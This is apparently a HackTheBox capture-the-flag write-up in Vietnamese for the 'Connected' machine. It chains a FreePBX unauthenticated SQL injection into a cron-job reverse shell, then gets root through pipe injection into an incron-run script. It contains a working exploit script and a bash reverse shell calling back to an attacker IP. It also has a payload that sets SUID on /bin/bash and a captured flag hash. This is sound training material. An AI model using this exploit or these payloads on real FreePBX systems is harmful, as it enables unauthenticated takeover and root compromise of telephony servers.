# HackTheBox - Connected | Writeup

![HTB Badge](https://img.shields.io/badge/HackTheBox-Connected-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)

## 📋 Machine Info

| Property       | Value                                      |
| -------------- | ------------------------------------------ |
| **Name**       | Connected                                  |
| **OS**         | Linux (CentOS)                             |
| **Difficulty** | Easy                                     |
| **IP**         | 10.129.x.x                                 |
| **Services**   | HTTP (80), HTTPS (443), SSH (22)            |
| **Application**| FreePBX 16.0.40.7                          |

---

## 🔍 Enumeration

### Port Scanning

```bash
nmap -sC -sV -oN nmap/connected 10.129.x.x
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

### Web Enumeration

Truy cập `http://10.129.x.x` → redirect tới **FreePBX** admin panel.

```
FreePBX 16.0.40.7
Asterisk Version: 18.x
```

FreePBX là một hệ thống PBX (Private Branch Exchange) mã nguồn mở dùng để quản lý tổng đài điện thoại VoIP, chạy trên nền tảng Asterisk.

---

## 🔓 Initial Access — CVE-2025-57819 (Unauthenticated SQLi → RCE)

### Vulnerability Analysis

FreePBX 16.0.40.7 tồn tại lỗ hổng **Unauthenticated SQL Injection** tại module **Endpoint Manager** (`/admin/ajax.php`). Tham số `brand` không được sanitize đúng cách, cho phép attacker chèn câu lệnh SQL tùy ý mà **không cần đăng nhập**.

**CVE:** CVE-2025-57819  
**Type:** Unauthenticated SQL Injection → Remote Code Execution  
**Affected Component:** `FreePBX\modules\endpoint\ajax`

### Exploitation

#### Bước 1: Tạo exploit script

FreePBX có một bảng `cron_jobs` trong database MySQL. Các job trong bảng này được thực thi bởi `fwconsole job --run` (chạy mỗi phút qua crontab của user `asterisk`). Bằng cách INSERT một record chứa reverse shell vào bảng này, ta đạt được RCE.

```python
# hack.py
import requests
import urllib3
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CẤU HÌNH ===
TARGET_IP = "10.129.x.x"       # IP target
LHOST = "10.10.14.x"           # IP Kali (tun0)
LPORT = "4444"                 # Listening port

# Tạo reverse shell command và mã hóa Base64 tự động
rev_shell = f'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
b64_payload = base64.b64encode(rev_shell.encode()).decode()
cron_command = f"echo {b64_payload} | base64 -d | bash"

# Câu lệnh SQLi - INSERT reverse shell vào bảng cron_jobs
sqli_payload = (
    f"x';INSERT INTO cron_jobs "
    f"(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) "
    f"VALUES ('sysadmin','takdak','{cron_command}',NULL,'* * * * *',30,1,1);--"
)

params = {
    "module": "FreePBX\\modules\\endpoint\\ajax",
    "command": "model",
    "template": "x",
    "model": "model",
    "brand": sqli_payload
}

print(f"[*] Target: {TARGET_IP}")
print(f"[*] Listener: {LHOST}:{LPORT}")
print("[*] Sending Reverse Shell Payload...")

r = requests.get(
    f"http://{TARGET_IP}/admin/ajax.php",
    params=params,
    headers={"Host": "connected.htb"},
    verify=False
)
print(f"[+] Server responded. Status: {r.status_code}")
print("[!] Cron runs every minute. WAIT UP TO 60 SECONDS...")
```

#### Bước 2: Bật listener và chạy exploit

```bash
# Terminal 1 — Listener
nc -lvnp 4444

# Terminal 2 — Exploit
python3 hack.py
```

#### Bước 3: Nhận shell

Sau tối đa 60 giây, ta nhận được reverse shell dưới quyền user **`asterisk`**:

```
connect to [10.10.14.x] from (UNKNOWN) [10.129.x.x] 35902
bash: no job control in this shell
[asterisk@connected ~]$
```

### User Flag 🚩

```bash
[asterisk@connected ~]$ cat user.txt
2ff42665e7a555e34c2e66c473317806
```

---

## ⬆️ Privilege Escalation — Incron + Pipe Injection in `sysadmin_manager`

### Enumeration

#### Kiểm tra incron rules

```bash
[asterisk@connected ~]$ cat /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

**Phân tích:** Daemon `incrond` (chạy dưới quyền **root**) giám sát thư mục `/var/spool/asterisk/incron/`. Khi có file được tạo/sửa/đóng, nó gọi `/usr/bin/sysadmin_manager` với tên file (`$#`) làm tham số.

#### Kiểm tra quyền sở hữu

```bash
[asterisk@connected ~]$ ls -la /var/spool/asterisk/incron/
drwxrwxr-x. 2 asterisk asterisk 6 Nov 30 2025 .

[asterisk@connected ~]$ ls -la /var/www/html/admin/modules/sysadmin/hooks/ | head -5
drwxr-xr-x.  2 asterisk asterisk  4096 Nov 30  2025 .
-rwxr-xr-x.  1 asterisk asterisk    83 Nov  2  2023 fail2ban-stop
```

**Phát hiện quan trọng:**
- Thư mục `incron/` thuộc quyền `asterisk` → ta có quyền ghi
- Tất cả hooks thuộc quyền `asterisk` → ta có quyền đọc
- `sysadmin_manager` là **PHP script** → ta đọc được mã nguồn

#### Phân tích mã nguồn `sysadmin_manager`

```bash
[asterisk@connected ~]$ file /usr/bin/sysadmin_manager
/usr/bin/sysadmin_manager: PHP script, ASCII text executable

[asterisk@connected ~]$ cat /usr/bin/sysadmin_manager
```

### Vulnerability Analysis

Sau khi đọc toàn bộ mã nguồn PHP của `sysadmin_manager`, ta phát hiện cơ chế hoạt động như sau:

#### 1. Xử lý tên file (Filename Parsing)

Script hỗ trợ hai định dạng tên file:
- `modulename_hookname` (VD: `sysadmin_fail2ban-stop`)
- `modulename.hookname.params` (VD: `sysadmin.fail2ban-stop.CONTENTS`)

```php
if (!preg_match('/^(\w+)_([\w-]+)$/', $request, $parts)) {
    if (!preg_match('/^([\w_]+)\.([\w-]+)(?:\.(.+))?$/', $request, $parts)) {
        syslog(LOG_ERR, "Invalid hook format");
        exit;
    }
}
```

#### 2. Cơ chế CONTENTS — Đọc nội dung file làm tham số

```php
if ($parts[3] === "CONTENTS") {
    $params = fread($fh, 4096);  // Đọc nội dung file trigger làm params
} else {
    $params = $parts[3];
}
```

Khi phần thứ ba của tên file là `CONTENTS`, script sẽ đọc **nội dung** của file trigger (đã được mở trước khi xóa) và dùng làm tham số cho hook.

#### 3. GPG Signature Verification — Kiểm tra chữ ký số

Script kiểm tra chữ ký GPG cực kỳ nghiêm ngặt:

```php
// Kiểm tra module.sig tồn tại và hợp lệ
$sigfile = "/var/www/html/admin/modules/$module/module.sig";
$verify = $g->checkSig($sigfile);

// Kiểm tra key nằm trong whitelist
$signedwith = $verify['config']['signedwith'];
if (!isset($whitelist[$signedwith])) { exit; }

// Kiểm tra hash SHA256 của hook file
if (hash_file('sha256', $hookfile) !== $verify['hashes'][$signame]) { exit; }
```

→ Ta **KHÔNG THỂ** sửa bất kỳ file hook nào vì hash SHA256 sẽ không khớp.

#### 4. Parameter Sanitization — Lọc ký tự đặc biệt

```php
// Chặn ký tự ngoài ASCII printable
if (preg_match('/[^\x20-\x7e]/', $params)) { exit; }

// Chặn các ký tự nguy hiểm
if (preg_match('/[`\'"$><&;]/', $params)) { exit; }
```

**Các ký tự bị chặn:** `` ` `` `'` `"` `$` `>` `<` `&` `;`

#### 5. Thực thi hook

```php
system("$hookfile $params");
```

### 🔥 The Vulnerability — Pipe Character `|` Not Filtered

Ký tự **`|` (pipe)** — một trong những ký tự nguy hiểm nhất trong shell — **KHÔNG NẰM TRONG DANH SÁCH BỊ CHẶN!**

Điều này cho phép ta inject một pipe command vào `$params` thông qua cơ chế `CONTENTS`:

```
system("/var/www/html/admin/modules/sysadmin/hooks/fail2ban-stop | /tmp/root.sh")
                                                                 ^^^^^^^^^^^^^^^^
                                                          Pipe injection → RCE as root!
```

Vì:
- Hook file `fail2ban-stop` **KHÔNG bị sửa đổi** → qua GPG signature check ✅
- Ký tự `|` **KHÔNG bị lọc** → qua parameter sanitization ✅
- Ký tự `/`, khoảng trắng đều nằm trong range `0x20-0x7e` → qua ASCII check ✅
- `incrond` chạy dưới quyền **root** → script payload chạy dưới quyền **root** ✅

### Exploitation

#### Bước 1: Tạo payload script

```bash
cat << 'EOF' > /tmp/root.sh
#!/bin/bash
chmod +s /bin/bash
cp /root/root.txt /tmp/root.txt
chmod 777 /tmp/root.txt
EOF
chmod +x /tmp/root.sh
```

#### Bước 2: Kích hoạt Pipe Injection

```bash
printf '| /tmp/root.sh' > /var/spool/asterisk/incron/sysadmin.fail2ban-stop.CONTENTS
```

**Giải thích chi tiết:**
1. `printf` ghi chuỗi `| /tmp/root.sh` (không có newline) vào file
2. File được tạo tại `/var/spool/asterisk/incron/` → kích hoạt sự kiện `IN_CLOSE_WRITE`
3. `incrond` (root) gọi: `sysadmin_manager sysadmin.fail2ban-stop.CONTENTS`
4. Script parse tên file → `module=sysadmin`, `hook=fail2ban-stop`, `params=CONTENTS`
5. Vì params = `"CONTENTS"`, script đọc nội dung file: `| /tmp/root.sh`
6. GPG signature check → **PASS** (hook file không bị sửa)
7. Parameter sanitization → **PASS** (`|` không bị lọc)
8. Thực thi: `system("fail2ban-stop | /tmp/root.sh")` → **ROOT RCE!**

#### Bước 3: Lấy Root Shell

```bash
[asterisk@connected ~]$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 964536 Apr  1  2020 /bin/bash
         ^
         SUID bit đã được set!

[asterisk@connected ~]$ /bin/bash -p
[root@connected ~]# whoami
root
```

### Root Flag 🚩

```bash
[root@connected ~]# cat /root/root.txt
<root_flag_hash>
```

---

## 🗺️ Attack Path Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    HTB Connected — Attack Path                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────┐    CVE-2025-57819     ┌──────────────┐           │
│  │  Attacker │ ──── SQLi ─────────► │  FreePBX     │           │
│  │  (Kali)   │    (Unauthenticated) │  ajax.php    │           │
│  └──────────┘                       └──────┬───────┘           │
│                                            │                    │
│                               INSERT INTO cron_jobs             │
│                               (reverse shell payload)           │
│                                            │                    │
│                                            ▼                    │
│                                   ┌────────────────┐           │
│                                   │  Shell as      │           │
│                                   │  asterisk      │           │
│                                   └────────┬───────┘           │
│                                            │                    │
│                               Pipe Injection via                │
│                               sysadmin_manager CONTENTS         │
│                               (| char not filtered)             │
│                                            │                    │
│                                            ▼                    │
│                                   ┌────────────────┐           │
│                                   │  Root Shell    │           │
│                                   │  via SUID bash │           │
│                                   └────────────────┘           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📝 Key Takeaways

1. **Unauthenticated SQLi vẫn rất phổ biến** — FreePBX Endpoint Manager không sanitize input tại tham số `brand`, cho phép attacker chèn SQL mà không cần xác thực.

2. **Incron + SUID = Privilege Escalation** — Daemon `incrond` chạy dưới quyền root, bất kỳ command injection nào thông qua nó đều cho phép leo quyền.

3. **Incomplete Input Sanitization** — Script `sysadmin_manager` lọc nhiều ký tự nguy hiểm (`` ` ' " $ > < & ; ``) nhưng **bỏ sót ký tự `|` (pipe)**, tạo ra lỗ hổng command injection nghiêm trọng.

4. **Defense in Depth không đủ** — Dù có GPG signature verification chặt chẽ cho hook files, lỗ hổng nằm ở khâu xử lý **tham số** (params) chứ không phải ở hook file.

---

## 🛠️ Tools Used

| Tool       | Purpose                          |
| ---------- | -------------------------------- |
| nmap       | Port scanning & service detection|
| Python3    | Exploit scripting (SQLi payload) |
| netcat     | Reverse shell listener           |
| mysql      | Database enumeration             |
| strings    | Binary/script analysis           |

---

*Writeup by phat | HackTheBox Season 11 2026*
